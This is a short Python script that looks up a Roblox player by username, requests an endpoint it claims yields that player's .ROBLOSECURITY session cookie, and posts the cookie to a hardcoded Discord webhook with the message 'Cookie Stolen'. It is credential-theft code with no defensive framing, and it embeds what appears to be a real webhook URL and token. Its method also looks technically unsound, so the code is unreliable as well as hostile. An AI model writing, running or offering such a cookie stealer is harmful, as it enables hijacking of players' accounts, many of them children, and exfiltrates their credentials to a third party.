import requests
import json

# Replace the player's Roblox username with the actual username
username = "PLAYER_USERNAME"

# Set the endpoint URL
url = f"https://www.roblox.com/users/profile/playerlookup.json?username={username}"

# Send a GET request to the endpoint URL
response = requests.get(url)

# Parse the response JSON and extract the player's user ID
user_id = json.loads(response.text)["UserId"]

# Set the cookie URL
cookie_url = f"https://www.roblox.com/game/GetCurrentUser.ashx?userid={user_id}"

# Send a GET request to the cookie URL
response = requests.get(cookie_url)

# Extract the ".ROBLOSECURITY" cookie from the response headers
cookie = response.headers["set-cookie"].split(";")[0]

# Set the Discord webhook URL
webhook_url = "https://discord.com/api/webhooks/1079517846473805834/iDbvfX1Kp9nKZPO4ZPBXJz_yQzcC7rOwWu__Y98h5l6VIuxsbABzQaC9KBvYEiv_NYjA"

# Set the webhook message payload
payload = {"content": f"`.ROBLOSECURITY` Cookie Stolen for {username}:\n{cookie}"}

# Send a POST request to the Discord webhook URL with the message payload
response = requests.post(webhook_url, json=payload)

# Print the response status code to confirm if the message was sent successfully
print(response.status_code)
